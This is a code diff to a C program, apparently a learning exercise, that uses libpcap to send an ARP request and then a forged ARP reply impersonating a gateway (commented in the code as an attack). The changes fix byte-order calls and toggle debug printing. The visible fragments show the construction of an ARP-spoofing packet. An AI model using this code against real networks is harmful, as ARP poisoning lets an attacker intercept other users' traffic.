@@ -53,11 +53,11 @@ int Set_request(struct ARP* arp, struct  Ethernet* eth,char* target_IP,char* dev
 	memcpy(arp->src_h_addr,ifr.ifr_hwaddr.sa_data,6);
 	memcpy(eth->src_mac,ifr.ifr_hwaddr.sa_data,6);
 	
-	arp->H_type=ntohs(0x0001);
-	arp->P_type=ntohs(0x0800);
+	arp->H_type=htons(0x0001);
+	arp->P_type=htons(0x0800);
 	arp->H_length=0x06;
 	arp->P_length=0x04;
-	arp->OPcode=ntohs(0x0001);
+	arp->OPcode=htons(0x0001);
 	inet_pton(AF_INET,target_IP,&arp->des_ip);
 	for(int i=0;i<6;i++)
 	{
@@ -72,7 +72,7 @@ int Set_reply(struct ARP* arp, struct Ethernet* eth,char* gateway_IP,uint8_t* ta
 {
 	memcpy(eth->des_mac,target_mac,6);
 	
-	arp->OPcode=ntohs(0x0002);
+	arp->OPcode=htons(0x0002);
 	memcpy(arp->des_h_addr,target_mac,6);
 	inet_pton(AF_INET,gateway_IP,&arp->src_ip);
 }
@@ -115,14 +115,15 @@ int main(int argc, char* argv[]) {
 	memcpy(request_packet,&eth,14);	
 	memcpy(request_packet+14,&arp,28);
 	
-	/* arp request packet
+	// arp request packet
 	for(int i=0;i<42;i++)
 	{
 		if(i%16 == 0) {printf("\n");}
 		printf("%02x ", request_packet[i]);
 	}
 	printf("\n");	
-	*/	
+	
+		
 	if(pcap_sendpacket(handle,request_packet,42)!= 0)
 	{
 		fprintf(stderr,"send error: %s\n",pcap_geterr(handle));
@@ -153,7 +154,8 @@ int main(int argc, char* argv[]) {
 	memcpy(reply_packet,&eth,14);
 	memcpy(reply_packet+14,&arp,28);
 	
-	/* arp reply packet(attack)
+	/*
+	 arp reply packet(attack)
 	for(int i=0;i<42;i++)
 	{
 		if(i%16 == 0) {printf("\n");}
@@ -166,6 +168,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	pcap_close(handle);
+	
 	return 0;
 }
 
